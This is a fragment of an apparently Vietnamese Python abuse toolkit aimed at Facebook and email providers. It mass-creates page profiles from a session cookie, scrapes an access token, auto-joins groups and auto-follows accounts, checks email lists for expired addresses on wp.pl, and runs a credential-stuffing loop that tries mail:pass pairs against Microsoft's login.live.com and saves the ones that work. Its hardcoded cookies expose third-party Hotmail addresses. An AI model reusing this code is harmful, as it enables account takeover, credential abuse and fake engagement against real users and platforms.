        headers_reg = {'authority': 'www.facebook.com','accept': '*/*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/pages/creation?ref_type=launch_point','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','viewport-width': '979','x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation','x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY','cookie': cookie}
        data_reg = {'av': uid,'__user': uid,'__a': '1','__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo','__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u','__req': 't','__hs': '19296.HYP:comet_pkg.2.1.0.2.1','dpr': '1','__ccg': 'EXCELLENT','__rev': '1006496476','__s': '1gapab:y4xv3f:2hb4os','__hsi': '7160573037096492689','__comet_req': '15','fb_dtsg': fb_dtsg,'jazoest': jazoest,'lsd': 'ZM7FAk6cuRcUp3imwqvHTY','__aaid': '800444344545377','__spin_r': '1006496476','__spin_b': 'trunk','__spin_t': '1667200829','fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation','variables': '{"input":{"bio":"Reg Auto By vLong Dec","categories":["181475575221097"],"creation_source":"comet","name":"'+namepage+'","page_referrer":"launch_point","actor_id":"'+uid+'","client_mutation_id":"1"}}','server_timestamps': 'true','doc_id': '5903223909690825',}
        try:
            idpage = requests.post('https://www.facebook.com/api/graphql/', headers=headers_reg, data=data_reg, timeout=20).json()['data']['additional_profile_plus_create']['additional_profile']['id']
            dem+=1
            print(f'{tim}{dem} {trang}| {xanh_la}SUCCESS {trang}| {tim}NAME FB{trang}: {vang}{name} {trang}| {tim}UID PRO5{trang}: {vang}{idpage} {trang}| {tim}NAME PRO5{trang}: {vang}{namepage}')
            return idpage
        except:
            print(f'{do}Reg Thất Bại Acc Của Bạn Đã Bị Block!!')
            
            return False


#==========================================================================================================================================================================
#==================================================================================================================
def get_token(cookie):
  header = {
    'authority': 'business.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'cookie': cookie,
    'referer': 'https://www.facebook.com/',
    'sec-ch-ua': '".Not/A)Brand";v="99","Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
  }
  try:
    home_business = requests.get('https://business.facebook.com/content_management', headers=header).text
    token = home_business.split('EAAG')[1].split('","')[0]
    token = f'EAAG{token}'
  except:
    print(f"{do}Cookie sai vui lòng lấy lại")
    quit()
  return token
#=========================================================================================================
def thanhngang(so):
  a= "\033[1;31m"+"────"*so
  for i in range(len(a)):
    sys.stdout.write(a[i])
    sys.stdout.flush()
    sleep(0.003)
    
#============================================================================================


#===========================================================================================
#=================================================================================================

def rungr(x):
    uid_page = list_id_name_page[x].split('|')[0]
    name_page = list_id_name_page[x].split('|')[1]
    time = datetime.datetime.now().strftime("%H:%M:%S")
    list1 = (f'i_user={uid_page};')
    cookie9 = (f'{cookie}{list1}')
    headers = {
        'authority': 'www.facebook.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/groups/'+str(id_gr)+'',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'viewport-width': '1221',
        'x-fb-friendly-name': 'GroupCometJoinForumMutation',
        'x-fb-lsd': '1CWQYotunk8BXwcjavghDO',
        'cookie': cookie9,
    }

    data = {
        'av': uid_page,
        '__user': uid_page,
        '__a': '1',
        '__dyn': '7AzHxqU5a5Q1ryaxG4VuC0BVU98nwgU765QdwSwMwNw9G2Saxa1NwJwpUe8hw6vwb-q7oc81xoswMwto88422y11xmfz83WwgEcHzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzEaE5e7oqBwJK2W5olwUwlu5pUfE2FBx_y8lz83VBwJCwLyES0Io88cA0z8c84qifxe3u362-2B0oobo8o',
        '__csr': 'gT3c9Tf4Ph3lndq9E8btWdIy8B6OFTAFqZuBpWIDkDYLF8HWhaKiB9qhqHB-yAFpRXyqWV4dWpaBiHZ7J9d4G5V8GmV9u9CgGK4oKVu4agtG5quFoy9zkeBGucHAmbGnKnyonykmErBg84ubyU6e4FGxa10zpo42axi1AwNzp8C13wIz98a8O6U9UiG2-48bU3fCK19wPwpoOdwKwsrwCw-wk85q1swu84C4E1gE0aJE09kE031nw2780oow8q0S8ANO06fg0F-05mE0m4y3Q0cnwtyw0r1oW0A81oE1981VE0-K0L82xw',
        '__req': 's',
        '__hs': '19323.HYP:comet_pkg.2.1.0.2.1',
        'dpr': '1',
        '__ccg': 'EXCELLENT',
        '__rev': '1006638605',
        '__s': 'g46m30:o2pr1z:3yzc8j',
        '__hsi': '7170501783158722778',
        '__comet_req': '15',
        'fb_dtsg': fb_dtsg,
        'jazoest': jazoest,
        'lsd': '1CWQYotunk8BXwcjavghDO',
        '__aaid': '497084035286445',
        '__spin_r': '1006638605',
        '__spin_b': 'trunk',
        '__spin_t': '1669512545',
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
        'variables': '{"feedType":"DISCUSSION","groupID":"'+str(id_gr)+'","imageMediaType":"image/x-auto","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1669512546874,734244,2361831622,","group_id":"'+str(id_gr)+'","group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":false},"actor_id":"'+uid_page+'","client_mutation_id":"1"},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":1,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":true}',
        'server_timestamps': 'true',
        'doc_id': '5608919199222447',
        'fb_api_analytics_tags': '["qpl_active_flow_ids=431626709"]',
    }

    response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).text
    print(f'\n\033[1;31m[{vang}{+str(x+1)}\033[1;31m] | \033[1;36m{str(time)} \033[1;31m| {xanh_la}SUCCESS \033[1;31m| \033[1;35m{str(uid_page)} \033[1;31m| \033[1;34m{str(name_page)} \033[1;31m| \033[1;37m{str(id_gr)} ')

#=================================================================================================
dem=0
class fb_buff_flow:
  def __init__(self,cookie):
    self.cookie = cookie
    self.headers = {
      'authority': 'mbasic.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'origin': 'https://www.facebook.com',
      'referer': 'https://www.facebook.com',
      'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
      }
      #continue 
  def get_thongtin(self):
      try:
          home = requests.get('https://mbasic.facebook.com/profile.php',headers=self.headers).text
          self.fb_dtsg = home.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
          self.jazoest = home.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
          ten = home.split('<title>')[1].split('</title>')[0]
          self.user_id = self.cookie.split('c_user=')[1].split(';')[0]
          print(f'\n{xanhnhat}Tên Facebook: {tim}{ten} {trang}| {xanhnhat}ID: {tim}{self.user_id} ', end='')
          sys.stdout.flush()
          return self.user_id
      except:
          print(f'{do}Không Get Được Thông Tin ! ')
          return 0
  def get_pro5(self):
    headers={
                  'authority': 'www.facebook.com',
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                  'accept-language': 'vi',
                  'cookie': self.cookie,
                  'sec-ch-prefers-color-scheme': 'light',
                  'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'document',
                  'sec-fetch-mode': 'navigate',
                  'sec-fetch-site': 'none',
                  'sec-fetch-user': '?1',
                  'upgrade-insecure-requests': '1',
                  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                  'viewport-width': '1366',
                }
    data ={
          'av':self.user_id,
          'fb_dtsg':self.fb_dtsg,
          'jazoest':self.jazoest,
          'fb_api_caller_class':'RelayModern',
          'fb_api_req_friendly_name':'CometSettingsDropdownListQuery',
          'variables':'{"fetchTestUserProfileListCell":false,"includeHorizBadging":false,"inProfileSwitcherEntry":false,"inSimpleHeaderEntry":true,"scale":2}',
          'server_timestamps':'true',
          'doc_id':'8179507702122101',
        }
    try:
        a=requests.post('https://www.facebook.com/api/graphql/', headers=headers,data=data).json()
        get = a['data']['viewer']['actor']['profile_switcher_eligible_profiles']
        tong = get['count']
        data_pro5 = get['nodes']
        print(f'{trang}| {vang}{tong} {xanh_la}Page Profile')
        return data_pro5
    except:
      print(f'\n{do}Không Get Được Page Profile ')
      return 0
  def follow(self, id, id_page, name):
    cookie = self.cookie
    ck_pro5 = cookie + '; i_user=' + id_page + ';'
    headers={
      'Host':'www.facebook.com',
      'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile':'?0',
      'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
      'viewport-width':'980',
      'content-type':'application/x-www-form-urlencoded',
      'x-fb-lsd':'ozBHo3fICOG_bXpKqo1J1C',
      'x-fb-friendly-name':'CometUserFollowMutation',
      'sec-ch-prefers-color-scheme':'light',
      'sec-ch-ua-platform':'"Linux"',
      'accept':'*/*',
      'origin':'https://www.facebook.com',
      'sec-fetch-site':'same-origin',
      'sec-fetch-mode':'cors',
      'sec-fetch-dest':'empty',
      'referer':'https://www.facebook.com/',
      'accept-language':'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cookie':ck_pro5
    }
    data={
      'av': id_page,
      'fb_dtsg': self.fb_dtsg,
      'jazoest': self.jazoest,
      'fb_api_caller_class':'RelayModern',
      'fb_api_req_friendly_name':'CometUserFollowMutation',
      'variables':'{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1669330367418,219724,250100865708545,","subscribe_location":"PROFILE","subscribee_id":"'+id+'","actor_id":"'+id_page+'","client_mutation_id":"1"},"scale":2}',
      'server_timestamps':'true',
      'doc_id':'5032256523527306'
    }
    try:
      fl=requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data)
      check = fl.json()['data']['actor_subscribe']['subscribee']['subscribe_status']
      if check == 'IS_SUBSCRIBED':
        print(f'{trang}[{do}</>{trang}] {trang}[{vang}{name} {trang}| {tim}{id_page}{trang}] {vang}FOLLOW {trang}[{vang}{id}{trang}] {xanh_la}SUCCESS ')
      else:
        print(f'{trang}[{do}</>{trang}] {trang}[{vang}{name} {trang}| {tim}{id_page}{trang}] {vang}FOLLOW {trang}[{vang}{id}{trang}] {do}ERROR ')
    except:
      print(f'{trang}[{do}</>{trang}] {trang}[{vang}{name} {trang}| {tim}{id_page}{trang}] {vang}FOLLOW {trang}[{vang}{id}{trang}] {do}ERROR ')

#================================================================================================
def o2pl():

        print(f"{tim}Hỗ Trợ Định Dạng Mail:Pass\n")
        try:
                nhap_file=input(F"\033[1;33mNhập File Chứa Email:{vang} ")
                luu_file=input(F"\033[1;32mNhập File Lưu Email Die:{vang} ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").readlines()
        list_o2=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=mail.split(':')[0]
                list_o2.append(email)
        def run(email):
                json_data = {
                'birthDate': '',
                'email': email,
                'lastName': '',
                'name': '',
                }
                headers = {
                'authority': '1login.wp.pl',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=utf-8',
                'cookie': 'statid=e962128ad34688aceb855c19160e3aff:873e8a:1666788132:v3; WPdp=djqH0g2MzpTXhFTBwFTXlhdRgkCFAMVRlBTP1tdVkZCSF5dUUZHSF1dXEZISFtBOUhdRgcDRlBDSEgcEEhLV0ZTEBlTXltHU1lEVFpJXFlFUF8MSEglNEhLH0gSD0hLVkZTBxkBDQ5TXkgqVTdTSEgcFkhLVkZTCR5TXlldRh4CRlBAUl1CUVpBXFJCUF5EGUZTMzo8RlAKRgvLong DecRlBDSEgSFxoYAEhLRjFASFhdV0ZFSF9dUkZGSFJdXUZAVDdTSEgcFkhLVkZTCR5TXlldRh4CRlBAUl1CUVpBXFJCUF5ESEgEBUhLVRcM; WPtcs2=CPleQcAPleQcABIACCPLCyCgAP_AAH_AAB5YJNNd_H__bW9r-f5_aft0eY1P9_rz7uQzDhfNk-4F3L_W_LwX52E7NF36tq4KmR4ku1LBIUNlHNHUDUmwaokVryHsak2cpTNKJ7BEknMZOydYGF9vmxtj-QKY5v5_d3bx2D-t_9v-39z3z81Xn3d5_-_02PCdV5_9Dfn9fR_b89KP9_78v4v8_____3_e__3_7997_H8EmwCTDVuIAuxLHAm0DCKBECMKwkIoFABBQDC0QEADg4KdlYBPrCBAAgFAEYEQIcAUYEAgAAAgCQiACQIsEAAAIgEAAIAEAiEABAwCCgAsDAIAAQDQMUQoABAvLong DecMiAiKUwICIEggJbKhBKC6Q0wgCrLACgERsFAAiAAAVgACAsHAMESAlYsECTFG-QAjBCgFEqFagk9NAA.YAAAAAAAAAAA; tpluid=3615708061775715700003; pubmaticuid=941DD036-98BE-452E-8499-76186C6ED927; STac=ac%3Ae962128ad34688aceb855c19160e3aff:1673500888:v1; ACac2=eJwyNDM3NjUwsDSxqAEEAAD//w24Aog=; WPabs=54b18b; rubiconuid=L6UG2JXH-M-4RUV; ixuid=Yvn0kYYtGU5dSVbl4mv.vLong DecAA&4765; openxmiud=64f119b3-9e05-4507-ac8a-8793417b648c; AUTH_CSRF_104d4adcd8f124c1=MTY3MzUwMDg5Mnx2QUhER1g3a3hPS0tWaDlvQU15RzkzLVFvbjU2bXBNSUJ1bGpuclBhcDRGei1JVk9mcnUyWnV2aFQ1cHV3Y3R1MWVCWkNQUlp8S6HAQOZsWKlcUd518R8_E08JVyuCH_mvhG1jFYav428=; AUTH_CSRF_104d4adf4f6a9fde=MTY3MzUwMDg5NXxKVjh3cGhXdkN2UW1LWndWUzJzZVNyckJLNjhSdnh3REpib24xZWVJTjVCeVNXOUdEVmtfU2FjRFoyWWpFN2Q4bXRPeE1UbWV8Cu93UcKuYDjUkefoHgpOQQLDQb0oIbTSXGrhTwrsRKs=; apnxuid=4768354384671984804; smartmiud=4745579592714038851; adfmuid=2278319693473096817; PWA_adbd=0; BDh=qlYyMjAyNjBUsqpWMjM1TExMMlGyMtRRSkuySDVINFOyMqytBQAAAP//AQAA//8=; BDhs=qlYyMjAyNjBUsqpWsjA2VrIy1FGyNFSyMqzVgcoYGmHK1QIAAAD//wEAAP//; STpage=onelogin:https%3A%2F%2F1login.wp.pl%2Fzaloguj%3Fclient_id%3Do2_o2_pl%26login_challenge%3DCjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU:1673500902:f3ecb0456244e754a8cd:v1; STvisit=62bb1d0e12c4dcc6301069e149d0a917:9032a0:1673500814:1673500902:6::::2:2:v2',
                'device-memory': '2',
                'downlink': '3.4',
                'dpr': '1',
                'ect': '4g',
                'origin': 'https://1login.wp.pl',
                'referer': 'https://1login.wp.pl/rejestracja?login_challenge=CjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU&registrationFlow=new&registrationBrand=o2',
                'rtt': '150',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"32"',
                'sec-ch-ua-full-version-list': '"Not?A_Brand";v="8.0.0.0", "Chromium";v="108.0.5359.126", "Google Chrome";v="108.0.5359.126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"0.1.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'viewport-width': '811',
                }
                params = {
                'login_challenge': 'CjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU',
                }
                url='https://1login.wp.pl/api/v1/public/ol-identity-provider/register/available'
                res=requests.post(url,json=json_data,headers=headers,params=params)
                if '"available":true' in res.text:
                        print("\033[1;32mDIE =>",email)
                        open(luu_file,"a").write(email+"\n")
                elif '"available":false' in res.text:
                        print("\033[1;31mLIVE =>",email)
                else:
                        print("\033[1;33mLỖI =>",email)
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, list_o2)


def passhot():
        ip = requests.get('http://ip-api.com/json/').json()
        getip=ip['query']
        getloc=ip['country']
        prx="\033[1;37m["+getip+"] "
        print("\033[1;33mĐịnh Dạng Mail:Pass Nha Mấy Sư Huynh, Sư Tỷ")
        print("\033[1;33mVì Không Add Proxy Nên 1 IP Lọc Tầm 350 Con Nha")
        print("\033[1;33mIP Của Bạn Là: "+"\033[1;35m"+getip)
        print("\033[1;33mQuốc Gia: "+"\033[1;35m"+getloc+"\n")
        try:
                nhap_file=input(f"\033[1;33mNhập File Chứa Email:{vang} ")
                file_luu=input(f"\033[1;36mNhập File Chứ Email Đúng Pass:{vang} ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").read().splitlines()
        for i in mo_file:
                username=i.split(':')[0]
                password=i.split(':')[1]
                full=username+':'+password
                data=f'i13=0&login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DSRbNbydhCQI7UBYYn7sgzEKr9lJ91WRB4hdSkLQ*%21ovnlHdQPsV1QQ27Dvc%21TKclcun1NBSi*CnP9EZdVXKlAOAAUH61HNhhJwIIb50BpjPtEZ2SV5mo9XCZBBgDa5r9Hs6C3qa5SBKjquqphWM76hLTXgH4CCIMIBi4g5oITnjX01%21O9OE8CA87pkIyREKH1Oc6gV9v3NMrFWuN1b*1LPMdZDj9WkNrmD*XqYrixkF3HL%21bKdZyvT7Wa3HtoWA6Di7OVFk0znk9kzhFGGeOnc%24&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=109148'
                headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'vi,vi-VN;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'mkt=vi-VN; MUID=0859B1B5057167623C40A11304176613; IgnoreCAW=1; MSFPC=GUID=14db3f842f794eae90bca52c8bfe44fd&HASH=14db&LV=202111&V=4&LU=1636029899129; omkt=vi-VN; MSCC=1658482893; NAP=V=1.9&E=1b70&C=n7XZkm1y-5bLzdS_CN_kcygrC5pXMOjvFTufi1uZHHxJ1cbluMdvNQ&W=2; ANON=A=7A4ADFDC056D516CCDBA1D98FFFFFFFF&E=1bca&W=1a; MSCC=27.76.84.33-VN; MSPBack=0; SDIDC=CXJ8S1cCVyP8nDdnsjB6b2IvDJG6Gv!qOMD28RSMO2jiJ8voGGf8FsIbwl7mqyfPsTCCz6Yshs5S0t0t6TqAy8R75zAesGHwGdTi5mnrJPvBvpDo0qjhOtQcB4kdKSOyyCvfQxN7JTfx15Bu56LzSbnlePdsHGsBl2YObsXdHiTzoqdqeWjx1TOX1yu2IsxZK3ZkE3LJco3viWFH6Ny*rv!6uvjorWPR6lkh0TH0vHnNGWGio6jPfahdyHw!axb*XclMAVJ8nhekF2BGtrBMih*DNmNki!nd0d8A9wCv7AzaIkxgCTwMPMnVXq5l663Y4erbc7F7VwAAHw!T6V3A5LtIeoxM!YT90ptPexPltzoNCHQ4TNZHikEAybFvQQqUx6AFNkuLvP3HkX9SATyNf6oRCKt!LJq*SYY!IaEjy114Ypp2GIuahWfdDqAQTn95i8wowTcmWOZiY68*qHxvLong Dech1W9oAiob3rjQEnS!zbaNt0KokmZH7KYo5MKuZm4QHQ*Q$$; MSPPre=lutherlokiant%40hotmail.com%7c687502c799fc1e5c%7c%7c; MSPCID=687502c799fc1e5c; JSHP=3$gubinytmesserhch%40hotmail.com$gubin$messer$$2$0$0$8702015853912225$0:tamaranelliesm%40hotmail.com$Tamara$Nellie$$2$0$0$11518232216403230720$0:kconynha%40hotmail.com$tr%c3%a2ng$phong$$2$0$0$8665848071110348517$0; MSPSoftVis=@:@; mkt1=vi-VN; amsc=AtiAkpAwc5ZtErmjTXsjtJfg4z48pVZV3lHYbvY6a21p3IMK3WvdF4zYw1zGrz4LwbOSvwObCADH8ZGqm7nXDCIwpa6rjofbxLMeCjD4nE6SGtzdZ/Pb+FEy1/KMLd4qxO/tLZk/Xgkd+I8eFWU9M1MhV46BDYSuE3b24TN+9WEjon07WzekCmhk0aWoPc000wZQ4FuMDNeNBOsQHBLXgJkMx+U3j/aZpiJUle2ycNcnBOJ8L8d9V16h0i0lv6uU:2:3c; __Host-MSAAUTH=; __Host-MSAAUTHP=; logonLatency=LGN01=638100785229924599; uaid=010023fd551245109b6237fa20f21aac; MSPRequ=id=292841&lt=1674481771&co=0; OParams=11O.DdPOGCE3ERQx6FIQnwivMpgSTLsRQUfrIhtM6EvYBTvWe4NF!mAj2I3NG2UXuV5WxiSXR9jkt01OC1esC0hfX4wKcA1tAGFZvxSORVVdj1toYnMCcZgzxHRduDBE6a3AOTR5s03AvxFcc4b0b8w0S5jtuAJxcJmC0HF1QgtRrv*v3RVg7QhmGqvvLong DecwGe4Nr7keDRmj3WAwfBZmG1sjeiVysp6UjWRDG3vjM69epJOepRU0AuaXZhfwOFmm!JrqJC4KFQQ8VrejQD2l5*nF!sjBONEyESfW!QB5!NNs7lME3cB6*njEk6LQ51UINyMjiFUc745pjrybQFAf2dlVOZ9aWoekFHTqZitsKFAqih66WVzelwQwpR1AkUUCbqMDzvvFI8fZhhtOzjlVA6GdCzQ3E6eDG!*zp3wnFuffbP99liro4ZSAgCDriWpRnYSYczszgz3qus!WObXbLyWCuijfD3eTf7IzORR1jULnHMmg!DZ**1rfB63l7DtpD9qo7UrMLRYztxRAwzthNeWmUWKVkc2xgRrVh6Ln2lj85ilSey; MSPOK=$uuid-b9328669-4421-425d-9c4e-64301fcade77$uuid-b8a50cf9-b908-4575-9222-ed60a160fe81$uuid-dc56724b-8c99-4339-9e58-8da1b6144232; wlidperf=FR=L&ST=1674481667886',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-c257-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                }
                url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-c257-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=C2F385635A95E5AE&bk=1674481726&uaid=08e4ec53f43e43249f38622bc4c1d15c&pid=0'
                res=requests.post(url,data=data,headers=headers)
                check=re.findall('Microsoft',res.text)
                if check == ['Microsoft','Microsoft','Microsoft']:
                        print(prx+"\033[1;32mSUCCESS:",full)
                        open(file_luu,"a").write(full+"\n")
                elif check == []:
                        print(prx+"\033[1;32mSUCCESS:",full)
                        open(file_luu,"a").write(full+"\n")
                elif check == ['Microsoft', 'Microsoft', 'Microsoft', 'Microsoft', 'Microsoft']:
                        dk2=requests.post('https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-c257-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=C2F385635A95E5AE&bk=1674481726&uaid=08e4ec53f43e43249f38622bc4c1d15c&pid=0',headers=headers,data=data)
                        check2 = re.findall('Bạn',dk2.text)
                        if check2 == []:
                                print(prx+"\033[1;31mWRONG PASSWORD:",full)
                        else:
                                print(prx+"\033[1;33mERROR:",full)
                else:
                        print(prx+"\033[1;33mERROR:",full)

def centrum():
        print(f"{tim}Hỗ Trợ Định Dạng Mail:Pass\n")
        try:
                nhap_file=input(f"\033[1;33mNhập File Chứa Email:{vang} ")
                luu_email=input(f"\033[1;94mNhập File Lưu Email Die:{vang} ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").readlines()
        listctr=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=mail.split(':')[0]
                user=email.split('@')[0]
                listctr.append(user)
        def run(user):
                data={
